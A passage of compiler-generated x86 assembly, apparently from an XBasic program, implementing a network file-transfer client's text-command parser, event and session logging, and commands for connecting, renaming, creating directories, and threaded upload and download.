	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetIPName ()  *****
;  *****
;
; [244] FUNCTION ProcessClientText (str$)
.code
;
#ifdef ProcessClientText.str$
#undef ProcessClientText.str$
#endif
#define ProcessClientText.str$ ebp+8	; exposes function argument 'str$'
;
align 16
_ProcessClientText.client@4:
;  *****
;  *****  FUNCTION  ProcessClientText ()  *****
;  *****
func38.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func38.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody38.client:
;
; [247] str$ = LTRIM$(str$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_ltrim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [248] IFZ	str$ THEN RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.34			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0006.client			;;; i192
A.34:
	mov	eax,0			;;; i659
	jmp	end.func38.client			;;; i258
else.0006.client:
end.if.0006.client:
;
; [250] IF str${0} = '/' THEN
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx]			;;; i464
	cmp	eax,47			;;; i684a
	jne	>> else.0007.client			;;; i219
;
; [251] GetToken (@str$,slash$,'/')
#ifdef ProcessClientText.slash$
#undef ProcessClientText.slash$
#endif
#define ProcessClientText.slash$ ebp-40	; exposes local variable 'slash$'
;
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk38.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	47			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func35.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	ecx,d[esp]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [252] GetToken (@str$,@cmd$,32)
#ifdef ProcessClientText.cmd$
#undef ProcessClientText.cmd$
#endif
#define ProcessClientText.cmd$ ebp-52	; exposes local variable 'cmd$'
;
	push	32			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func35.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	[ebp+8],ecx			;;; i670
	mov	[ebp-52],ebx			;;; i670
;
; [253] ProcessClientCmd (0,TRIM$ (cmd$),str$)
	sub	esp,64			;;; i487
	mov	eax,[ebp-52]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	mov	[ebp-48],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	call	func39.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [254] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func38.client			;;; i258
;
; [255] ELSE
	jmp	end.if.0007.client			;;; i107
else.0007.client:
;
; [256] CPrint ($$main,"- "+str$)
	mov	eax,addr @_string.0100.client			;;; i663
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [257] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func38.client			;;; i258
;
; [258] END IF
end.if.0007.client:
;
; [260] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ProcessClientText.client:  ;;; Function end label for Assembly Programmers.
end.func38.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func38.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func38.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ProcessClientText ()  *****
;  *****
;
; [262] FUNCTION EventLog (idx,msg$)
.code
;
#ifdef EventLog.idx
#undef EventLog.idx
#endif
#define EventLog.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef EventLog.msg$
#undef EventLog.msg$
#endif
#define EventLog.msg$ ebp+12	; exposes function argument 'msg$'
;
align 16
_EventLog.client@8:
;  *****
;  *****  FUNCTION  EventLog ()  *****
;  *****
func3D.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3D.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody3D.client:
;
; [263] SHARED eventlog$
data section 'globals$shared'
align	4
%eventlog$.client:	db 4 dup ?
.code
;
; [264] STRING text
#ifdef EventLog.text
#undef EventLog.text
#endif
#define EventLog.text ebp-40	; exposes local variable 'text'
;
;
; [267] ClearEditText ($$event)
	push	201			;;; i656a
	call	func1C.client			;;; i619
;
; [268] text = "\r\n--- event log start ---"+msg$+"\r\n--- event log end ---"
	mov	eax,addr @_string.0105.client			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0106.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [269] CPrint ($$event, text)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	201			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [271] IF eventlog$ THEN
	mov	eax,[%eventlog$.client]			;;; i663a
	test	eax,eax			;;; i214
	jz	>> else.0008.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.0008.client			;;; i218
;
; [272] of = OPEN (eventlog$,$$WRNEW)
#ifdef EventLog.of
#undef EventLog.of
#endif
#define EventLog.of ebp-44	; exposes local variable 'of'
;
	sub	esp,64			;;; i487
	mov	eax,[%eventlog$.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_open.v
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [273] IF of < 3 THEN
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,3			;;; i684a
	jge	>> else.0009.client			;;; i219
;
; [274] CPrint ($$main," *** unable to save event log: "+eventlog$)
	mov	eax,addr @_string.0109.client			;;; i663
	mov	ebx,[%eventlog$.client]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [275] ELSE
	jmp	end.if.0009.client			;;; i107
else.0009.client:
;
; [276] WRITE [of],text
	mov	eax,d[ebp-44]			;;; i665
; .filenumber = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	sub	esp,64			;;; i271
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i272
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp+4],eax			;;; i273
	call	%_WriteString			;;; i274
	add	esp,64			;;; i275
;
; [277] CLOSE (of)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_close
	add	esp,64			;;; i600
;
; [278] END IF
end.if.0009.client:
;
; [279] END IF
else.0008.client:
end.if.0008.client:
;
; [281] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3D.client			;;; i258
;
; [282] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.EventLog.client:  ;;; Function end label for Assembly Programmers.
end.func3D.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3D.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3D.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  EventLog ()  *****
;  *****
;
; [284] FUNCTION SessionLog (idx,msg$)
.code
;
#ifdef SessionLog.idx
#undef SessionLog.idx
#endif
#define SessionLog.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef SessionLog.msg$
#undef SessionLog.msg$
#endif
#define SessionLog.msg$ ebp+12	; exposes function argument 'msg$'
;
align 16
_SessionLog.client@8:
;  *****
;  *****  FUNCTION  SessionLog ()  *****
;  *****
func3C.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3C.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody3C.client:
;
; [285] SHARED sessionlog$
data section 'globals$shared'
align	4
%sessionlog$.client:	db 4 dup ?
.code
;
; [286] STRING text
#ifdef SessionLog.text
#undef SessionLog.text
#endif
#define SessionLog.text ebp-40	; exposes local variable 'text'
;
;
; [289] ClearEditText ($$event)
	push	201			;;; i656a
	call	func1C.client			;;; i619
;
; [290] text = "\r\n--- session log start ---"+msg$+"\r\n--- session log end ---"
	mov	eax,addr @_string.010E.client			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.010F.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [291] CPrint ($$event, text)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	201			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [293] IF sessionlog$ THEN
	mov	eax,[%sessionlog$.client]			;;; i663a
	test	eax,eax			;;; i214
	jz	>> else.000A.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.000A.client			;;; i218
;
; [294] of = OPEN (sessionlog$,$$WRNEW)
#ifdef SessionLog.of
#undef SessionLog.of
#endif
#define SessionLog.of ebp-44	; exposes local variable 'of'
;
	sub	esp,64			;;; i487
	mov	eax,[%sessionlog$.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_open.v
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [295] IF of < 3 THEN
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,3			;;; i684a
	jge	>> else.000B.client			;;; i219
;
; [296] CPrint ($$main," *** unable to save session log: "+sessionlog$)
	mov	eax,addr @_string.0111.client			;;; i663
	mov	ebx,[%sessionlog$.client]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [297] ELSE
	jmp	end.if.000B.client			;;; i107
else.000B.client:
;
; [298] WRITE [of],text
	mov	eax,d[ebp-44]			;;; i665
; .filenumber = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	sub	esp,64			;;; i271
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i272
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp+4],eax			;;; i273
	call	%_WriteString			;;; i274
	add	esp,64			;;; i275
;
; [299] CLOSE (of)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_close
	add	esp,64			;;; i600
;
; [300] END IF
end.if.000B.client:
;
; [301] END IF
else.000A.client:
end.if.000A.client:
;
; [303] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3C.client			;;; i258
;
; [304] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SessionLog.client:  ;;; Function end label for Assembly Programmers.
end.func3C.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3C.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3C.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  SessionLog ()  *****
;  *****
;
; [306] FUNCTION ProcessClientCmd (idx,cmd$,msg$)
.code
;
#ifdef ProcessClientCmd.idx
#undef ProcessClientCmd.idx
#endif
#define ProcessClientCmd.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef ProcessClientCmd.cmd$
#undef ProcessClientCmd.cmd$
#endif
#define ProcessClientCmd.cmd$ ebp+12	; exposes function argument 'cmd$'
;
;
#ifdef ProcessClientCmd.msg$
#undef ProcessClientCmd.msg$
#endif
#define ProcessClientCmd.msg$ ebp+16	; exposes function argument 'msg$'
;
align 16
_ProcessClientCmd.client@12:
;  *****
;  *****  FUNCTION  ProcessClientCmd ()  *****
;  *****
func39.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func39.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.47:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.47			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody39.client:
;
; [307] SHARED sessionlog$,eventlog$
;
; [308] RECT rc
; .composites = ebp-40	; internal variable
#ifdef ProcessClientCmd.rc
#undef ProcessClientCmd.rc
#endif
#define ProcessClientCmd.rc ebp-44	; exposes local variable 'rc'
;
;
; [309] STATIC tid
data section 'globals$statics'
align	4
%39%tid.client:	db 4 dup ?
.code
;
; [310] STATIC STRING strgd,strgu
data section 'globals$statics'
align	4
%39%strgd.client:	db 4 dup ?
.code
data section 'globals$statics'
align	4
%39%strgu.client:	db 4 dup ?
.code
;
; [311] SHARED hwndPrev[]
data section 'globals$shared'
align	4
%%%hwndPrev.client:	db 4 dup ?
.code
;
; [314] msg$ = LTRIM$(RTRIM$(msg$))
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.v			;;; i583
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_ltrim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [315] cmd$ = LCASE$(LTRIM$(trim(cmd$,32)))
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk39.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	32			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func41.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[esp],eax			;;; i887
	call	%_ltrim.d.s			;;; i583
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [317] SELECT CASE cmd$
	mov	eax,[ebp+12]			;;; i665
	call	%_clone.a0			;;; i259
; .select39.000C = ebp-56	; internal variable
	mov	esi,[ebp-56]			;;; i665
	mov	[ebp-56],eax			;;; i670
	call	%____free			;;; i260
;
; [318] CASE "server","connect"	:JoinServer (idx,msg$): RETURN $$TRUE
	mov	eax,addr @_string.011C.client			;;; i663
	mov	ebx,[ebp-56]			;;; i665
	call	%_string.compare.vv			;;; i690
	je	>> caser.000C.0000.client			;;; i70
	mov	eax,addr @_string.011D.client			;;; i663
	call	%_string.compare.vv			;;; i690
	jne	>> case.000C.0001.client			;;; i71
caser.000C.0000.client:
	mov	eax,d[ebp+16]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3A.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	eax,-1			;;; i659
	jmp	end.func39.client			;;; i258
;
; [319] CASE "part","disconnect":DisconnectServer (0): RETURN $$TRUE
	jmp	end.select.000C.client			;;; i69
case.000C.0001.client:
	mov	eax,addr @_string.011E.client			;;; i663
	mov	ebx,[ebp-56]			;;; i665
	call	%_string.compare.vv			;;; i690
	je	>> caser.000C.0001.client			;;; i70
	mov	eax,addr @_string.011F.client			;;; i663
	call	%_string.compare.vv			;;; i690
	jne	>> case.000C.0002.client			;;; i71
caser.000C.0001.client:
	push	0			;;; i656a
	call	func3B.client			;;; i619
	mov	eax,-1			;;; i659
	jmp	end.func39.client			;;; i258
;
; [320] CASE "alias"			:ProcessClientCmd (idx,"server","192.168.1.1 "+STRING$($$SR_LPort)): RETURN $$TRUE
	jmp	end.select.000C.client			;;; i69
case.000C.0002.client:
	mov	eax,addr @_string.0120.client			;;; i663
	mov	ebx,[ebp-56]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000C.0003.client			;;; i71
	mov	eax,addr @_string.011C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-52],eax			;;; i670
	sub	esp,64			;;; i487
	mov	d[esp],404
	call	%_string.slong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0121.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func39.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
	mov	eax,-1			;;; i659
	jmp	end.func39.client			;;; i258
;
; [321] CASE "quit"				:Shutdown ()
	jmp	end.select.000C.client			;;; i69
case.000C.0003.client:
	mov	eax,addr @_string.0123.client			;;; i663
	mov	ebx,[ebp-56]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000C.0004.client			;;; i71
	call	func4.client			;;; i619
;
; [322] CASE ELSE				:IFF #authok THEN
	jmp	end.select.000C.client			;;; i69
case.000C.0004.client:
data section 'globals$shared'
align	4
%#authok.client:	db 4 dup ?
.code
	mov	eax,d[%#authok.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.000D.client			;;; i195
;
; [323] 'CPrint ($$main,"*** must auth first")
;
; [324] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func39.client			;;; i258
;
; [325] END IF
else.000D.client:
end.if.000D.client:
;
; [326] END SELECT
end.select.000C.client:
;
; [328] SELECT CASE cmd$
	mov	eax,[ebp+12]			;;; i665
	call	%_clone.a0			;;; i259
; .select39.000E = ebp-60	; internal variable
	mov	esi,[ebp-60]			;;; i665
	mov	[ebp-60],eax			;;; i670
	call	%____free			;;; i260
;
; [329] CASE "rename"			:renameTreeFile (getTreeSelection (#tree_tab),TRIM$(msg$))
	mov	eax,addr @_string.0125.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0001.client			;;; i71
data section 'globals$shared'
align	4
%#tree_tab.client:	db 4 dup ?
.code
	push	[%#tree_tab.client]			;;; i672a
	call	func50.client			;;; i619
	mov	d[ebp-52],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func59.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [330] CASE "newdir"			:createTreeNewDir (getTreeSelection (#tree_tab),TRIM$(msg$))
	jmp	end.select.000E.client			;;; i69
case.000E.0001.client:
	mov	eax,addr @_string.0127.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0002.client			;;; i71
	push	[%#tree_tab.client]			;;; i672a
	call	func50.client			;;; i619
	mov	d[ebp-52],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	func58.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [331] CASE "tree"				:newTreeRootDir (TRIM$(msg$))
	jmp	end.select.000E.client			;;; i69
case.000E.0002.client:
	mov	eax,addr @_string.0128.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0003.client			;;; i71
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	push	eax			;;; i667a
	call	func5D.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
;
; [332] CASE "upload"			:strgu = msg$
	jmp	end.select.000E.client			;;; i69
case.000E.0003.client:
	mov	eax,addr @_string.0129.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0004.client			;;; i71
	mov	eax,[ebp+16]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %39%strgu.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [333] _beginthreadex (NULL, 0, &ClientUpload(), &strgu, 0, &tid)
;
; [0] EXTERNAL CFUNCTION  _beginthreadex (lpThreadAttributes, dwStackSize, Startess, lpParameter, dwCreationFlags, lpThreadId)
#ifdef ProcessClientCmd.NULL
#undef ProcessClientCmd.NULL
#endif
#define ProcessClientCmd.NULL ebp-64	; exposes local variable 'NULL'
;
	mov	eax,addr _ClientUpload.client@4			;;; i599
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[%39%strgu.client]			;;; i642
; .xstk39.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	lea	eax,[%39%tid.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [334] Sleep(20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [335] CASE "download"			:strgd = msg$
	jmp	end.select.000E.client			;;; i69
case.000E.0004.client:
	mov	eax,addr @_string.012C.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0005.client			;;; i71
	mov	eax,[ebp+16]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %39%strgd.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [336] _beginthreadex (NULL, 0, &ClientDownload(), &strgd, 0, &tid)
	mov	eax,addr _ClientDownload.client@4			;;; i599
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[%39%strgd.client]			;;; i642
	mov	d[ebp-72],eax			;;; i670
	lea	eax,[%39%tid.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [337] Sleep(20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [338] 'CASE "listen"			:ClientListen (@msg$)
;
; [339] CASE "clr","cls"		:ClearEditText (XLONG(msg$)+ $$main-1)
	jmp	end.select.000E.client			;;; i69
case.000E.0005.client:
	mov	eax,addr @_string.012D.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	je	>> caser.000E.0005.client			;;; i70
	mov	eax,addr @_string.012E.client			;;; i663
